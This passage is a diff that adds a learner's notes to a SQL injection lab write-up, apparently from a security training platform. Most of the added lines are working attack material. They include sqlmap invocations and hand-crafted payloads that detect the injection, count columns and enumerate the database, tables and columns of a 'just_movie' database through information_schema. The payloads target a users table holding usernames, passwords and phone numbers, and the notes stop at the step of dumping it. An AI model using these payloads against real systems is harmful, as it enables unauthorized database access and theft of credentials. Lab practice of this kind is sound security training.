@@ -347,3 +347,30 @@ This lab contains is a SQL Injection vulnerability in the forgot password functi
 To complete the lab, perform a Time-Based Blind SQL Injection attack observing the changes in response time and retrieve the database name.
 
 What is database name?
+
+solved with ->
+: sqlmap -r requests.txt --risk=3 --level=3 --technique=E
+
+: sqlmap -r requests.txt --risk=3 --level=3 --dbs
+
+* sqlmap exam machine
+Solved with sqlmap again, but now i can enum the number of columns and start the UNION payload craft
+
+Vuln detect ->
+: ' OR 1=1;#
+
+Get the number of columns ->
+: ' ORDER BY 3;#
+
+First crafted payload ->
+: ' UNION SELECT 1,DATABASE(),3;#
+
+A little bit more complex payload after get the database name ->
+: ' UNION SELECT 1,group_concat(table_name),USER() FROM information_schema.tables WHERE table_schema = 'just_movie';#
+
+Now get the discoverd tables/columns ->
+: ' UNION SELECT 1,group_concat(column_name),USER() FROM information_schema.columns WHERE table_schema = 'just_movie' AND table_name='users';#
+
+id,fullname,username,password,phone
+
+Now get the users table columns content ->
